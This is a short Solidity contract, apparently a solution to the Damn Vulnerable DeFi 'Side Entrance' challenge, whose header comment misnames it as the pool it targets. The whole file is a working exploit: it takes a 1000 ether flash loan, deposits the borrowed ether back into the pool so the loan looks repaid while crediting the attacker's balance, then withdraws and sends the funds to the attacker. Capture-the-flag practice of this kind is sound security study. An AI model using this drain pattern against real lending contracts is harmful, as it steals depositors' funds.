// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function withdraw() external;

    function flashLoan(uint256 amount) external;

    function deposit() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideHack {
    address public immutable pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function attack(address payable _attacker) external {
        IPool(pool).flashLoan(1000 ether);
        IPool(pool).withdraw();
        _attacker.transfer(1000 ether);
    }

    function execute() external payable {
        IPool(pool).deposit{value: 1000 ether}();
    }

    receive() external payable {}
}
